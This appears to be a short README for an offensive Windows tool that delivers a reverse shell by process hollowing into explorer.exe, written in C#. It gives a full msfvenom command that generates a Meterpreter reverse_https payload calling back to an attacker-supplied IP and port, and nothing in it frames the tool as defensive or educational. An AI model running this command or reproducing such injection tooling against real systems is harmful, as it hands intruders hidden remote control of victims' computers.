# ReverseShell and ProcessHollowing for Windows
Here is a simple reverse shell via process injection in explorer.exe written in C#, based on the .NET Framework.

You will need to generate a shellcode based on the target architecture : msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<LP> -f exe -o reverse_shell.exe
